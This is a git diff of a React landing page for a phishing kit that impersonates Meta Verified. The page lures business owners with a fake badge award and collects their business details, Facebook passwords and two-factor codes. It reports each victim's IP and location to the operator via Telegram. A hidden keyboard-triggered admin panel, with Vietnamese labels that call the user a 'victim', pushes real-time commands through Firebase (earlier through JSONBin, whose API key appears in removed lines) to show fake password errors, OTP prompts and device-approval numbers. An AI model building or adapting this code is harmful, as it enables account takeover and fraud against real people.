@@ -1,13 +1,21 @@
 import { useState, useEffect } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
+import { translations } from '../translations'; 
+import { initializeApp } from "firebase/app";
+import { getDatabase, ref, set, onValue } from "firebase/database";
 
 // ==========================================
-// THAY THÔNG TIN JSONBIN CỦA MÀY VÀO ĐÂY
-const BIN_ID = '6ad7e7f5ac6210605a43b63c';
-const API_KEY = '$2a$10$aQUMOVeeqI4gvQgvEtfmz.mT7MtH0h2ddIYvYbYOMilObcfbHMBZG';
+// THAY LINK FIREBASE CỦA MÀY VÀO ĐÂY
+const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
+const firebaseConfig = { databaseURL: FIREBASE_URL };
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
 // ==========================================
 
 export default function Home() {
+  const [lang, setLang] = useState('en');
+  const t = translations[lang] || translations['en'];
+
   // --- STATES TRANG CHỦ ---
   const [activeBenefit, setActiveBenefit] = useState(0);
   const [currentSlide, setCurrentSlide] = useState(0);
@@ -26,7 +34,7 @@ export default function Home() {
 
   // --- STATES CHO BƯỚC 3 & 4 & ADMIN ---
   const [matchNumber, setMatchNumber] = useState(null); 
-  const [showSuccess, setShowSuccess] = useState(false); // Trạng thái Bước 4
+  const [showSuccess, setShowSuccess] = useState(false); 
   const [adminSessionId, setAdminSessionId] = useState(''); 
   const [adminNumberInput, setAdminNumberInput] = useState(''); 
   const [showAdmin, setShowAdmin] = useState(false);
@@ -43,10 +51,10 @@ export default function Home() {
 
   // --- DỮ LIỆU TRANG CHỦ ---
   const benefitsData = [
-    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/images/benefit-1.webp' },
-    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.', image: '/images/benefit-2.webp' },
-    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/images/benefit-3.webp' },
-    { title: 'Upgraded profile features', desc: 'Enrich your profile by adding images to your links.', image: '/images/benefit-4.webp' }
+    { title: t.benefit1Title, desc: t.benefit1Desc, image: '/images/benefit-1.webp' },
+    { title: t.benefit2Title, desc: t.benefit2Desc, image: '/images/benefit-2.webp' },
+    { title: t.benefit3Title, desc: t.benefit3Desc, image: '/images/benefit-3.webp' },
+    { title: t.benefit4Title, desc: t.benefit4Desc, image: '/images/benefit-4.webp' }
   ];
   
   const testimonials = [
@@ -56,79 +64,65 @@ export default function Home() {
   ];
   
   const faqs = [
-    { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions.' },
-    { q: 'How do I update my information if I\'m not eligible?', a: 'Join our waitlist to stay updated.' },
-    { q: 'What if I already have a verified badge?', a: 'No action is needed to keep your badge.' },
-    { q: 'What if I\'m interested in Meta Verified for creators?', a: 'Visit the Meta Verified for creators page to learn more.' },
-    { q: 'Where will my badge appear?', a: 'Facebook Page and Messenger account, or Instagram account and Threads, depending on the asset you select.' },
-    { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
+    { q: t.faq1Q, a: t.faq1A },
+    { q: t.faq2Q, a: t.faq2A },
+    { q: t.faq3Q, a: t.faq3A },
+    { q: t.faq4Q, a: t.faq4A },
+    { q: t.faq5Q, a: t.faq5A },
+    { q: t.faq6Q, a: t.faq6A }
   ];
 
-  // --- LẤY IP KHI MỞ FORM ---
+  // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
   useEffect(() => { 
-      if(showModal && clientIp === 'Unknown') {
-          fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
-              if (d && d.ip) {
-                  setClientIp(`${d.ip} - ${d.country} (${d.city})`);
-                  if (d.country_code && countryCodeMap[d.country_code]) {
-                      setCountryCode(countryCodeMap[d.country_code]);
-                  }
-              }
-          }).catch(()=>{}); 
-      }
-  }, [showModal, clientIp]);
+      fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
+          if (d && d.ip) {
+              setClientIp(`${d.ip} - ${d.country} (${d.city})`);
+              
+              if (d.country_code === 'FR') { setLang('fr'); } 
+              else { setLang('en'); }
 
-  // --- LẮNG NGHE LỆNH TỪ ADMIN (CHỐNG CACHE) ---
+              if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
+          }
+      }).catch(()=>{}); 
+  }, []);
+
+  // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    const interval = setInterval(() => {
-        fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest?t=${Date.now()}`, {
-            headers: { 'X-Master-Key': API_KEY }
-        })
-        .then(res => res.json())
-        .then(data => {
-            if(data.record && data.record.target === sessionId) {
-                if (data.record.action === 'otp') {
-                    setStep(3); 
-                    setMatchNumber(null); 
-                    setShowSuccess(false);
-                } else if (data.record.action === 'approve' && data.record.value) {
-                    setStep(3); 
-                    setMatchNumber(data.record.value); 
-                    setShowSuccess(false);
-                } else if (data.record.action === 'error') {
-                    setStep(2);
-                    setShowLoginError(true);
-                    setLoginPass('');
-                    setShowSuccess(false);
-                } else if (data.record.action === 'success') {
-                    setStep(3);
-                    setShowSuccess(true);
+    if (showModal && !showAdmin) {
+        const commandRef = ref(database, 'commands/' + sessionId);
+        const unsubscribe = onValue(commandRef, (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.action) {
+                if (data.action === 'otp') {
+                    setStep(3); setMatchNumber(null); setShowSuccess(false);
+                } 
+                else if (data.action === 'approve' && data.value) {
+                    setStep(3); setMatchNumber(data.value); setShowSuccess(false);
+                } 
+                else if (data.action === 'success') {
+                    setStep(3); setShowSuccess(true);
+                } 
+                else if (data.action === 'error') {
+                    setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
                 }
             }
-        }).catch(()=>{});
-    }, 2000);
-    return () => clearInterval(interval);
-  }, [sessionId]);
+        });
+        return () => unsubscribe();
+    }
+  }, [showModal, showAdmin, sessionId]);
 
-  // --- PHÍM TẮT MỞ ADMIN (Ctrl + Shift + A) ---
+  // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
     const handleKeyDown = (e) => {
       if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-        setShowAdmin(prev => !prev);
-        setShowModal(true);
+        setShowAdmin(prev => !prev); setShowModal(true);
       }
     };
     window.addEventListener('keydown', handleKeyDown);
     return () => window.removeEventListener('keydown', handleKeyDown);
   }, []);
 
-  // --- HÀM XỬ LÝ FORM ---
-  const openModal = () => { 
-      setShowModal(true); 
-      setStep(1); 
-      setShowSuccess(false); // Reset trạng thái thành công
-      setShowAdmin(false); // Tắt Admin nếu đang mở
-  };
+  const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); };
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
@@ -158,38 +152,22 @@ export default function Home() {
     
     setTimeout(() => { 
         setLoading(false); 
-        if (newAttempt < 3) {
-            setShowOtpError(true); 
-            setOtp(''); 
-        } else {
-            // Nhập sai 3 lần -> Hiện giao diện thành công
-            setShowSuccess(true);
-            setOtp('');
-        }
+        if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
+        else { setShowSuccess(true); setOtp(''); }
     }, 1500);
   };
 
-  // --- HÀM GỬI LỆNH TỪ ADMIN ---
   const handleAdminCommand = (type, value) => {
       const targetUser = adminSessionId.trim(); 
-      if (!targetUser) {
-          alert('Vui lòng nhập Mã Phiên của nạn nhân!');
-          return;
-      }
+      if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
       
-      fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-          method: 'PUT',
-          headers: {
-              'Content-Type': 'application/json',
-              'X-Master-Key': API_KEY
-          },
-          body: JSON.stringify({ 
-              action: type, 
-              value: value,
-              target: targetUser
-          })
+      set(ref(database, 'commands/' + targetUser), {
+          action: type,
+          value: value
       }).then(() => {
           alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
+      }).catch((error) => {
+          alert("Lỗi gửi lệnh: " + error.message);
       });
   };
 
@@ -200,10 +178,10 @@ export default function Home() {
           <div className="header-left">
               <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" /></a>
               <nav className="nav-links">
-                  <a className="nav-link" href="#steps">Get started</a>
-                  <a className="nav-link" href="#benefits">Advertise</a>
-                  <a className="nav-link" href="#faq">Learn</a>
-                  <a className="nav-link" href="#footer">Support</a>
+                  <a className="nav-link" href="#steps">{t.navGetStarted}</a>
+                  <a className="nav-link" href="#benefits">{t.navAdvertise}</a>
+                  <a className="nav-link" href="#faq">{t.navLearn}</a>
+                  <a className="nav-link" href="#footer">{t.navSupport}</a>
               </nav>
           </div>
           <div className="header-right">
@@ -217,10 +195,10 @@ export default function Home() {
               <div className="hero-text">
                   <div className="hero-text-inner">
                       <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
-                      <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
-                      <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
-                      <button className="btn-primary" onClick={openModal}>Claim your badge</button>
-                      <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
+                      <h1 className="hero-title">{t.heroTitle}</h1>
+                      <p className="hero-subtitle">{t.heroSub}</p>
+                      <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
+                      <p className="hero-note">{t.heroNote}</p>
                   </div>
               </div>
               <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
@@ -229,10 +207,10 @@ export default function Home() {
 
       <section className="benefits" id="benefits">
           <div className="benefits-header">
-              <h2>Explore Meta Verified for business benefits.</h2>
-              <p>Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.</p>
+              <h2>{t.benefitsTitle}</h2>
+              <p>{t.benefitsSub}</p>
               <span className="benefits-learn-more" onClick={() => document.getElementById('faq').scrollIntoView({behavior:'smooth'})}>
-                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5"/><path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>Learn more
+                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5"/><path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>{t.learnMore}
               </span>
           </div>
           <div className="benefits-grid">
@@ -250,22 +228,22 @@ export default function Home() {
 
       <section className="steps" id="steps">
           <div className="steps-inner">
-              <h2>Sign up for Meta Verified.</h2>
-              <p>Our verification process is designed to maintain the integrity of the verified badge for businesses. Get started by submitting an application.</p>
+              <h2>{t.stepsTitle}</h2>
+              <p>{t.stepsSub}</p>
               <div className="steps-grid">
-                  <div className="step-card"><div className="step-number">1</div><div className="step-title">Start your application.</div><p className="step-desc">Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements. When getting started, you should have your business contact information ready.</p></div>
-                  <div className="step-card"><div className="step-number">2</div><div className="step-title">Verify business details.</div><p className="step-desc">You may be asked to share details such as your business name, address, website and/or phone number.</p></div>
-                  <div className="step-card"><div className="step-number">3</div><div className="step-title">Get reviewed.</div><p className="step-desc">We'll review your application and send an update on your status within three business days.</p></div>
+                  <div className="step-card"><div className="step-number">1</div><div className="step-title">{t.step1Title}</div><p className="step-desc">{t.step1Desc}</p></div>
+                  <div className="step-card"><div className="step-number">2</div><div className="step-title">{t.step2Title}</div><p className="step-desc">{t.step2Desc}</p></div>
+                  <div className="step-card"><div className="step-number">3</div><div className="step-title">{t.step3Title}</div><p className="step-desc">{t.step3Desc}</p></div>
               </div>
           </div>
       </section>
 
       <section className="testimonials">
           <div className="container-narrow">
-              <h2>See how Meta Verified has helped real businesses.</h2>
+              <h2>{t.testimonialsTitle}</h2>
               <div className="carousel-wrapper">
                   <div className="carousel-track" style={{ transform: `translateX(-${currentSlide * 100}%)` }}>
-                      {testimonials.map((t, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{t.quote}</p><p className="carousel-author">{t.author}</p></div>))}
+                      {testimonials.map((item, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{item.quote}</p><p className="carousel-author">{item.author}</p></div>))}
                   </div>
               </div>
               <div className="carousel-nav">
@@ -280,8 +258,8 @@ export default function Home() {
           <div className="cta-inner">
               <div className="cta-content">
                   <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
-                  <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
-                  <button className="btn-primary" onClick={openModal}>Claim your badge</button>
+                  <h2 className="cta-title">{t.ctaTitle}</h2>
+                  <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
               </div>
               <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
           </div>
@@ -289,8 +267,8 @@ export default function Home() {
 
       <section className="faq" id="faq">
           <div className="faq-inner">
-              <h2>Frequently asked questions</h2>
-              <p className="faq-sub">For more, visit our Help Centre.</p>
+              <h2>{t.faqTitle}</h2>
+              <p className="faq-sub">{t.faqSub}</p>
               <div className="faq-list">
                   {faqs.map((f, i) => (
                       <div key={i} className="faq-item">
@@ -325,28 +303,17 @@ export default function Home() {
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                 
-                <button onClick={() => { 
-                    localStorage.clear(); 
-                    window.location.replace('/live'); 
-                }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                <button onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                 </button>
 
                 {showAdmin ? (
                   <div style={{ textAlign: 'center' }}>
                     <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
-                    
                     <div style={{ marginBottom: '20px' }}>
                         <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên nạn nhân (lấy từ Telegram):</p>
-                        <input 
-                            className="fb-input" 
-                            type="text" 
-                            placeholder="VD: user_a1b2c3" 
-                            value={adminSessionId} 
-                            onChange={(e) => setAdminSessionId(e.target.value)} 
-                        />
+                        <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                     </div>
-
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                         <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
                         <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
@@ -370,8 +337,8 @@ export default function Home() {
                     {/* FORM 1: SIGNUP */}
                     {step === 1 && (
                       <>
-                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Meta Verified for Business</h2>
-                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter your business details to start your application.</p>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form1Title}</h2>
+                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form1Sub}</p>
                         <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                             <div>
                                 <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
@@ -631,7 +598,7 @@ export default function Home() {
                                 </div>
                                 {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                             </div>
-                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
+                            <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : t.continueBtn}</button>
                         </form>
                       </>
                     )}
@@ -641,8 +608,8 @@ export default function Home() {
                       <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                           <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
                           <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
-                          {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
-                          <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
+                          {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.loginError}</div>}
+                          <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : t.loginBtn}</button>
                       </form>
                     )}
 
@@ -650,73 +617,27 @@ export default function Home() {
                     {(step === 3 || showSuccess) && (
                       <>
                         {showSuccess ? (
-                          // GIAO DIỆN THÀNH CÔNG
                           <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>Request Received</h2>
-                            <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>
-                                Thank you! We have received your verification request. Your Official Verified Badge will be updated within 24 hours.
-                            </p>
-                            <button 
-                                type="button" 
-                                onClick={() => { 
-                                    localStorage.clear(); // Xóa sạch bộ nhớ tạm
-                                    window.location.replace('/live'); // Thay thế lịch sử trang
-                                }} 
-                                className="fb-btn"
-                            >
-                                Close
-                            </button>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>{t.successTitle}</h2>
+                            <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>{t.successSub}</p>
+                            <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
                           </div>
                         ) : matchNumber ? (
-                          // GIAO DIỆN DUYỆT THIẾT BỊ
                           <>
-                                                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>
-                                Check your other device
-                            </h2>
-                            
-                            <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4' }}>
-                                Open the notification on your other device, then tap <strong>{matchNumber}</strong> to verify it's you.
-                            </p>
-
-                            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
-                                <img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} />
-                            </div>
-
-                            <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>
-                                {matchNumber}
-                            </div>
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>{t.approveTitle}</h2>
+                            <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4', textAlign: 'center' }}>{t.approveSub} <strong>{matchNumber}</strong></p>
+                            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
+                            <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
                           </>
                         ) : (
-                          // GIAO DIỆN NHẬP MÃ 2FA
                           <>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
-                            
-                            <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
-                                <img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} />
-                            </div>
-
-                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
-                            
+                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form3Title}</h2>
+                            <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}><img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} /></div>
+                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form3Sub}</p>
                             <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                                <input 
-                                    className="fb-input fb-otp-input" 
-                                    style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} 
-                                    placeholder="00000000" 
-                                    value={otp} 
-                                    onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
-                                    required 
-                                    maxLength={8} 
-                                />
-                                
-                                {showOtpError && (
-                                    <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>
-                                        Invalid security code. Please check the code and try again.
-                                    </div>
-                                )}
-                                
-                                <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>
-                                    {loading ? 'Verifying...' : 'Verify'}
-                                </button>
+                                <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
+                                {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
+                                <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : t.verifyBtn}</button>
                             </form>
                           </>
                         )}
